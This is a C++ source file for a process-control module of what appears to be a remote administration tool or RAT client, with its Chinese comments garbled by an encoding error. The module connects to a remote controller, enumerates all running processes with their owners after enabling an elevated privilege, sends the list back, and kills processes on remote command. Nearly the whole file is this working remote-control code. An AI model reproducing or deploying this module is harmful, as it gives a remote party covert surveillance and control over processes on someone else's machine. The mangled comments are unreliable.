#include "pch.h"
#include "Proc.h"

static Proc gProc;

Proc::Proc() {

	// hunter������ʳ��
	CmdFreshProcs = "FRESH_PROCS";
	CmdKillProc = "KILL_PROC";
	// ʳ�﷢����hunter
	CmdSendProc = "SEND_PROC";
	CmdKillProcSuccess = "KILL_SUCCESS";
	CmdKillProcFailed = "KILL_FAILED";
	// �ָ��������
	CmdSplit = ";";
	CmdEnd = "\r\n";
}

void Proc::startByNewThread(std::string domain, int port)
{
	// �������Ͷ˿ںϲ�Ϊһ��char*
	// ����new�����Ŀռ���fileThreadProc��delete
	char* args = new char[MAX_PATH + sizeof(int)];
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);
	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	// ����ճ�¯��char*����
	HANDLE h = CreateThread(NULL, 0, Proc::procThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD Proc::procThreadProc(LPVOID args)
{
	// ��ȡ����������Ͷ˿���Ϣ
	char domain[MAX_PATH];
	memcpy(domain, args, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH));

	startProc(domain, port);
	// ������delete
	delete [] (char*)args;
	return true;
}

void Proc::startProc(std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for proc\r\n");
	}

	OutputDebugStringA("Started proc\r\n");

	const int packetSize = 800;
	char szData[packetSize];
	int ret;
	std::string buf;

	while (true) {
		// �����ݻ��������� ��ֹռ��cpu
		ret = sock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}
		// ���յ������ݼ��뵽buffer
		addDataToBuffer(&sock, buf, szData, ret);
	}

	OutputDebugStringA("Finished Proc\r\n");
}


void Proc::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
	buf.append(data, size);

	// �ָ�ÿ������Ͳ�����ִ��
	int endIndex;
	while ((endIndex = buf.find(gProc.CmdEnd)) >= 0) {
		std::string line = buf.substr(0, endIndex);
		buf.erase(0, endIndex + gProc.CmdEnd.length());

		int firstSplit = line.find(gProc.CmdSplit);
		std::string cmd = line.substr(0, firstSplit);
		line.erase(0, firstSplit + gProc.CmdSplit.length());
		// ִ�б�����
		processCmd(sock, cmd, line);
	}
}

// ���������� ����ӳ�� ��ʳ�����߳���Ľ�����һ���ĵ���
std::map<std::string, std::string> Proc::parseArgs(std::string& data)
{
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(gProc.CmdSplit);
	pos1 = 0;
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + gProc.CmdSplit.size();
		pos2 = data.find(gProc.CmdSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));

	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

void Proc::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
{
	std::map<std::string, std::string> args = parseArgs(data);

	if (cmd == gProc.CmdFreshProcs) {
		doFreshProcs(sock);
		return;
	}

	if (cmd == gProc.CmdKillProc) {
		doKillProc(sock, args);
		return;
	}
}

void Proc::doFreshProcs(TcpSocket* sock) {

	std::string data; // ��������

	// ����ctoolhelp�������������̿���
	CToolhelp thProcesses(TH32CS_SNAPPROCESS);
	PROCESSENTRY32 pe = { sizeof(pe) };
	BOOL fOk = thProcesses.ProcessFirst(&pe);
	for (; fOk; fOk = thProcesses.ProcessNext(&pe)) {

		// �ų������� ��ֹ��hunter��ɾ
		if (pe.th32ProcessID == GetCurrentProcessId()) {
			continue;
		}

		// �õ�pid
		CHAR szPid[8];
		_itoa_s((int)pe.th32ProcessID, szPid, sizeof(szPid), 10);
		// ��ȡ����������
		TCHAR szOwner[MAX_PATH + 1];
		if (!GetProcessOwner(pe.th32ProcessID, szOwner, MAX_PATH)) {
			StringCchPrintf(szOwner, sizeof(szOwner), "Cannot get");
		}
		// ƴ�ӷ�����Ϣ
		data.clear();
		data.append(gProc.CmdSendProc + gProc.CmdSplit);
		data.append("EXENAME" + gProc.CmdSplit);
		data.append(pe.szExeFile + gProc.CmdSplit);
		data.append("PID" + gProc.CmdSplit);
		data.append(szPid + gProc.CmdSplit);
		data.append("OWNER" + gProc.CmdSplit);
		data.append(szOwner + gProc.CmdEnd);
		// ����
		sock->sendData(data.data(), data.size());
	}
}

void Proc::doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args) {

	std::string data; // ������Ϣ
	DWORD dwPid = atoi(args["PID"].data());
	// ��ʼkill����
	HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
	do
	{
		if (hProc == NULL) {
			OutputDebugStringA("open process failed\r\n");
			break;
		}
		if (TerminateProcess(hProc, 0) == 0) {
			OutputDebugStringA("terminate process failed\r\n");
			break;
		}

		OutputDebugStringA("kill process successfully\r\n");
		data.append(gProc.CmdKillProcSuccess + gProc.CmdEnd);
		sock->sendData(data.data(), data.size());
		return;

	} while (false);

	data.append(gProc.CmdKillProcFailed + gProc.CmdEnd);
	sock->sendData(data.data(), data.size());
	return;
}

BOOL Proc::GetProcessOwner(HANDLE hProcess, LPTSTR szOwner, size_t cchSize) {

	// �������
	if ((szOwner == nullptr) || (cchSize == 0))
		return(FALSE);

	// ����Ĭ��ֵ
	StringCchPrintf(szOwner, cchSize, "Unknown");

	// �õ��������ƾ��
	HANDLE hToken = nullptr;
	// ������һ���Ƚϸߵ�Ȩ�ޣ���Ϊ����ϵͳ��һ���� �Բ���ϵͳ��ʽ������
	CToolhelp::EnablePrivilege(SE_TCB_NAME, TRUE);
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
		CToolhelp::EnablePrivilege(SE_TCB_NAME, FALSE);
		return(FALSE);
	}

	// ��ȡTOKEN_USER�ṹ��С
	DWORD cbti = 0;
	GetTokenInformation(hToken, TokenUser, nullptr, 0, &cbti);

	// �����Ҹ�Ϊdo-while��ʽ �߼������һЩ
	do {
		// ���ڸղ�ֻ�������С ���Է����������ֵ����������
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			break;
		// ����ѿռ�����Žṹ��
		PTOKEN_USER ptiUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, cbti);
		if (ptiUser == nullptr)
			break;

		// �õ�ָ��token��tokenuser��Ϣ
		if (GetTokenInformation(hToken, TokenUser, ptiUser, cbti, &cbti)) {
			SID_NAME_USE   snu;
			TCHAR          szUser[MAX_PATH];
			DWORD          chUser = MAX_PATH;
			PDWORD         pcchUser = &chUser;
			TCHAR          szDomain[MAX_PATH];
			DWORD          chDomain = MAX_PATH;
			PDWORD         pcchDomain = &chDomain;

			// ͨ���û�SID��ȡ�û�������������
			if (LookupAccountSid(
				nullptr,
				ptiUser->User.Sid,
				szUser,
				pcchUser,
				szDomain,
				pcchDomain,
				&snu)) {
				// ����\\DomainName\UserName��ʽ���ַ���
				_tcscpy_s(szOwner, cchSize, TEXT("\\\\"));
				_tcscat_s(szOwner, cchSize, szDomain);
				_tcscat_s(szOwner, cchSize, TEXT("\\"));
				_tcscat_s(szOwner, cchSize, szUser);
			}
		}

		// �ͷ��ڴ�
		HeapFree(GetProcessHeap(), 0, ptiUser);

	} while (FALSE);

	// �ͷž��
	CloseHandle(hToken);

	// ����Ȩ������
	CToolhelp::EnablePrivilege(SE_TCB_NAME, FALSE);

	return(TRUE);
}

// ͨ������pid��ȡ����������
BOOL Proc::GetProcessOwner(DWORD PID, LPTSTR szOwner, DWORD cchSize) {

	// �������
	if ((PID <= 0) || (szOwner == nullptr))
		return(FALSE);

	// �򿪽��̾��
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID);
	if (hProcess == nullptr)
		return(FALSE);

	// ���ǵ��������Ǹ�����
	BOOL bReturn = GetProcessOwner(hProcess, szOwner, cchSize);

	// �ͷž��
	CloseHandle(hProcess);

	return(bReturn);
}
